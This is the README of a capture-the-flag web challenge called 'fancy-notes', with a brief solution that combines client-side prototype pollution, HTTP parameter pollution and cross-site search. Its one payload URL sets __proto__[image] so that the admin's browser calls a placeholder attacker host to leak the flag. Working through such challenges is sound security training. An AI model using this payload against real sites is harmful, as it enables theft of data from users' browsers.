# fancy-notes
**Category:** Web
**Difficulty:** Medium-Hard
**Author:** downgrade

## Description

Your typical note taking app, but this time its fancy! Share your coolest notes with the admin, and if they're cool enough, maybe he'll give you a special prize.

## Distribution

fancy-notes-dist.zip

## Solution

Client side prototype pollution + http parameter pollution + xs search. `http://localhost:1337/fancy?q=idekctf{&__proto__[image]=x&__proto__[image]=http://<attacker_url>/success`
